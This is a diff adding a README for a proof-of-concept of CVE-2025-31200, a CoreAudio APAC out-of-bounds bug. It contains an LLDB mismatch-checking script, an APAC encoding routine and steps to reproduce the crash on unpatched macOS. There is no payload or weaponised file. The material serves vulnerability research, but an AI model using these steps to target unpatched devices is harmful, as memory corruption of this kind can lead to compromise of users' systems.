@@ -1,3 +1,179 @@
+
+# CVE-2025-31200 - Apple CoreAudio APACChannelRemapper Exploit (PoC)
+
+This repository demonstrates a proof-of-concept for CVE-2025-31200, a vulnerability in Apple's CoreAudio `APACChannelRemapper::Process` function, discovered in iOS 18.4 and patched in iOS 18.4.1 / macOS 15.4.1.
+
+---
+
+## 🔍 Overview
+
+- **Vulnerability**: CVE-2025-31200
+- **Affected Component**: `AudioCodecs` → `APACChannelRemapper::Process`
+- **Issue**: Out-of-Bounds Read/Write via mRemappingArray mismatch
+- **PoC Requirement**: macOS < 15.4.1
+- **Trigger**: Playing a specially crafted `.mp4` (APAC audio) file
+- **Impact**: Controlled write primitive with potential for RCE
+
+---
+
+## 💻 Technologies Used
+
+| Component            | Description |
+|---------------------|-------------|
+| AudioToolbox        | CoreAudio framework |
+| APAC                | Apple Positional Audio Codec |
+| HOA                 | Higher-order Ambisonics |
+| LLDB                | Debugger (used to inspect mismatch) |
+| afconvert           | Used to convert WAV to APAC format |
+| GuardMalloc         | Detect memory corruption during playback |
+| Xcode               | Debugging on macOS |
+| output.mp4          | Crafted test audio file |
+
+---
+
+## 📜 1. LLDB Hook Script: `check-mismatch.py`
+
+```python
+import lldb
+
+def __lldb_init_module(debugger, internal_dict):
+    debugger.HandleCommand('command script add -f check_mismatch.check_mismatch check-mismatch')
+
+def check_mismatch(debugger, command, result, internal_dict):
+    target = debugger.GetSelectedTarget()
+    process = target.GetProcess()
+    thread = process.GetSelectedThread()
+    frame = thread.GetSelectedFrame()
+
+    try:
+        mRemappingArray_expr = "((APACChannelRemapper *)$x0)->mRemappingArray"
+        layout_expr = "((APACChannelRemapper *)$x0)->mChannelLayout"
+
+        remap_val = frame.EvaluateExpression(mRemappingArray_expr)
+        layout_val = frame.EvaluateExpression(layout_expr)
+
+        if remap_val.IsValid() and layout_val.IsValid():
+            count_remap = remap_val.GetNumChildren()
+            count_layout = layout_val.GetChildMemberWithName("mNumberChannelDescriptions").GetValueAsUnsigned()
+
+            print(f"[check-mismatch] remappingArray size: {count_remap}")
+            print(f"[check-mismatch] mChannelDescriptions count: {count_layout}")
+
+            if count_remap != count_layout:
+                print("[check-mismatch] ❗️Mismatch detected!")
+            else:
+                print("[check-mismatch] ✅ Arrays are consistent")
+        else:
+            print("[check-mismatch] Error: Unable to resolve remappingArray or layout")
+    except Exception as e:
+        print(f"[check-mismatch] Exception: {e}")
+```
+
+Usage:
+```lldb
+command script import check-mismatch.py
+check-mismatch
+```
+
+---
+
+## 🎵 2. PoC Encoder: `encodeme.mm`
+
+```objc
+#import <AudioToolbox/AudioToolbox.h>
+
+void encodeToAPAC() {
+    NSString *inputPath = @"/path/to/input.wav";
+    NSString *outputPath = @"/path/to/output_apac.m4a";
+
+    NSURL *inputURL = [NSURL fileURLWithPath:inputPath];
+    NSURL *outputURL = [NSURL fileURLWithPath:outputPath];
+
+    ExtAudioFileRef inFile = NULL;
+    ExtAudioFileRef outFile = NULL;
+    OSStatus status;
+
+    AudioStreamBasicDescription inFormat;
+    UInt32 propSize = sizeof(inFormat);
+
+    status = ExtAudioFileOpenURL((__bridge CFURLRef)inputURL, &inFile);
+    ExtAudioFileGetProperty(inFile, kExtAudioFileProperty_FileDataFormat, &propSize, &inFormat);
+
+    AudioStreamBasicDescription apacFormat = {0};
+    apacFormat.mSampleRate = 48000;
+    apacFormat.mFormatID = kAudioFormatAPAC;
+    apacFormat.mChannelsPerFrame = 4;
+    apacFormat.mFramesPerPacket = 1024;
+
+    ExtAudioFileCreateWithURL((__bridge CFURLRef)outputURL,
+                               kAudioFileM4AType,
+                               &apacFormat,
+                               NULL,
+                               kAudioFileFlags_EraseFile,
+                               &outFile);
+
+    ExtAudioFileSetProperty(outFile, kExtAudioFileProperty_ClientDataFormat, sizeof(inFormat), &inFormat);
+
+    UInt32 bufferSize = 4096;
+    UInt8 buffer[bufferSize];
+    AudioBufferList bufferList = {0};
+    bufferList.mNumberBuffers = 1;
+    bufferList.mBuffers[0].mData = buffer;
+    bufferList.mBuffers[0].mDataByteSize = bufferSize;
+    bufferList.mBuffers[0].mNumberChannels = inFormat.mChannelsPerFrame;
+
+    while (true) {
+        UInt32 frameCount = bufferSize / inFormat.mBytesPerFrame;
+        status = ExtAudioFileRead(inFile, &frameCount, &bufferList);
+        if (frameCount == 0 || status != noErr) break;
+        ExtAudioFileWrite(outFile, frameCount, &bufferList);
+    }
+
+    ExtAudioFileDispose(inFile);
+    ExtAudioFileDispose(outFile);
+}
+```
+
+---
+
+## 🧪 3. Reproduction Steps
+
+1. Setup a macOS < 15.4.1 system
+2. Convert audio using `encodeme.mm` or:
+```bash
+afconvert -o output.mp4 -d apac -f mp4f sound440hz.wav
+```
+3. Enable **GuardMalloc** in Xcode
+4. Debug with LLDB:
+```bash
+lldb ./your_audio_player
+run output.mp4
+check-mismatch
+```
+
+---
+
+## 📎 Notes
+
+- The `kAudioFormatAPAC` may require a manual define: `#define kAudioFormatAPAC 'apac'`
+- Internals may vary slightly depending on your system version.
+
+---
+
+MIT License
+
+
+
+
+
+
+
+
+
+
+------------------------------------------------------------
+저자설명
+
 Proof-of-concept for the CoreAudio patch (CVE-2025-31200) in [iOS 18.4.1](https://support.apple.com/en-us/122282).
 
 # Update 05/27/2025
